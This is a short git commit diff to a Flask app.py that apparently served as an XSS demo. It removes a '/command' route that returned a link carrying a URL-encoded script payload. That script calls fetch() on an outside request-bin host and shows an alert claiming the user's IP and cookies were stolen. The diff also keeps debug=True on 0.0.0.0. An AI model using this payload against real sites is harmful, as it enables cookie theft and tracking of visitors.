24aa00fcffa87c7de72c9c6edad34bf39c8e342f
Deva Midhun <86113389+turbomaster95@users.noreply.github.com>
2023-03-25 11:44:55 +0000

    Updated app.py

--- app.py
+++ app.py
@@ -18,8 +18,5 @@ def index():
     response.set_cookie('name', 'value')
     return response
 
-@app.route("/command")
-def command():
-    return "Go To this Link (Copy this) : http://192.168.0.7/?q=%3Cscript%3E%0Aconst%20url='https://hookb.in/3ONmXMeElPh7yakkMWZR';%0Afetch(url);%0Aalert(atob(%22SGVsbG8hIFVzZXIhCllvdSBIYXZlIEJlZW4gSG9va2VkIQpZb3VyIElQIGhhcyBiZWVuIFN0b2xlbiEKWW91ciBDb29raWVzLi4uLiBTdG9sZW4hClJlZ2FyZHMsCk9QSE9PSw==%22))%0A%3C/script%3E"
 
-app.run(host='0.0.0.0', port=80, debug=True)
+app.run(host='0.0.0.0', port=8080, debug=True)
